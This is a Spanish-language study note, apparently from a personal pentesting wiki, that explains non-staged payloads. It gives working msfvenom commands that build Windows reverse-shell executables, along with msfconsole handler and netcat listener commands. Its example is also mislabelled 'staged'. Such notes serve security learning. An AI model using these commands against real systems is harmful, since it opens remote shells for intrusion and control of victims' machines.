Un "payload non-staged" (carga útil no escalonada) es una forma de diseño de exploits o herramientas de penetración en ciberseguridad donde la carga útil se envía y ejecuta de manera completa y directa en el sistema objetivo en una sola fase. A diferencia de los "[[payload staged]]" que se dividen en múltiples etapas, los "payloads non-staged" se ejecutan de manera inmediata y completa una vez que se activa el exploit.

En el contexto de un ataque informático, un "payload non-staged" se carga en la memoria del sistema objetivo y se ejecuta sin la necesidad de establecer una conexión previa o dividir el proceso en múltiples etapas. Esto puede ser útil en situaciones donde la simplicidad y la velocidad de ejecución son prioritarias, o cuando no es necesario evadir medidas de seguridad específicas que puedan detectar las técnicas de "staging".

Ejemplo de payload staged:

En este caso estamos utilizando [[metasploit]]:

- Con el siguiente comando creamos un archivo ejecutable específicamente para la plataforma Windows:
```msfvenom -p windows/x64/meterpreter_reverse_tcp --platform windows -a x64 LHOST=192.168.111.45 LPORT=4646 -f exe -o reverse.exe```
- Una vez la máquina victima tiene el archivo, ingresamos a msfconsole desde la máquina atacante y aplicamos los siguientes comandos en base al sistema que estemos atacando:
```use exploit/multi/handler```
```set payload windows/x64/meterpreter_reverse_tcp```
```set LHOST 192.168.111.45``` En este caso esta es nuestra IP
```run``` Una vez esté todo configurado ya podemos correr el payload que generamos

---
Si requieres utilizar netcat o alguna otra shell distintas puedes cambiar el [[msfvenom]] de la siguiente forma:
```msfvenom -p windows/x64/shell_reverse_tcp --platform windows -a x64 LHOST=192.168.111.45 LPORT=4646 -f exe -o reverse.exe```

Una vez la máquina victima tiene el archivo, ingresamos a el siguiente comando dentro de la máquina del atacante:
```nc -nlvp 4646```
